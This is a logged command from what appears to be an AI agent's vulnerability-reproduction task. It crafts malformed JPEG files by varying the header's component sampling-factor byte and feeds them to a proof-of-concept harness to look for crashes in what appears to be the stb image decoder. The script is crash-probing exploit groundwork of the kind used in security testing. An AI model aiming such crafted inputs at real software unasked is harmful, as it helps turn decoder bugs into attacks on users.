message:
Command `cd /workspace/repo-vul/src-vul/stb && python3 - <<'PY'
from pathlib import Path
from PIL import Image
img=Image.new('RGB',(3,3),(10,20,30))
img.save('/tmp/base2.jpg','JPEG',subsampling=0,quality=90)
orig=bytearray(Path('/tmp/base2.jpg').read_bytes())
idx=orig.find(b'\xff\xc0')
cs=idx+2+2+1+2+2+1
print('base bytes',list(orig[cs:cs+9]))
# try many sampling bytes for first component only, keep others 0x11
for samp in [0x21,0x31,0x41,0x12,0x13,0x14,0x22,0x23,0x24,0x32,0x42,0x33,0x34,0x43,0x44]:
    data=bytearray(orig)
    data[cs+1]=samp
    p='/tmp/t.jpg'
    Path(p).write_bytes(data)
    import subprocess
    r=subprocess.run(['/tmp/jpeg_poc',p],capture_output=True,text=True)
    if r.returncode!=0:
        print('samp',hex(samp),'rc',r.returncode)
        print('\n'.join(r.stderr.splitlines()[:12]))
PY` executed with exit code 0.
